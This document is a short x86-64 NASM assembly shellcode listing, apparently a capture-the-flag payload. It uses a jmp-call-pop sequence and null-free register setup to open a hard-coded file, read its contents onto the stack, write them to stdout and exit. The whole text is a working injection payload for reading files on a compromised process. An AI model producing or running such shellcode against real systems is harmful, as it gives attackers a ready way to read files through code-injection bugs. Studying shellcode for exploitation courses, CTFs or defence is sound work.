BITS 64

[SECTION .text]

global _start

_start:
jmp _push_filename

_readfile:
pop rdi

;open 
xor rax, rax
add al, 2
xor rsi, rsi
syscall

;read 
sub sp, 0xfff
lea rsi, [rsp]
mov rdi, rax
xor rdx, rdx
mov dx, 0xfff
xor rax, rax
syscall

; write to stdout
xor rdi, rdi
add dil, 1
mov rdx, rax
xor rax, rax
add al, 1
syscall

; syscall exit
xor rax, rax
add al, 60
syscall


_push_filename:
call _readfile
db "thisisaveryrandomnameamiriteB"
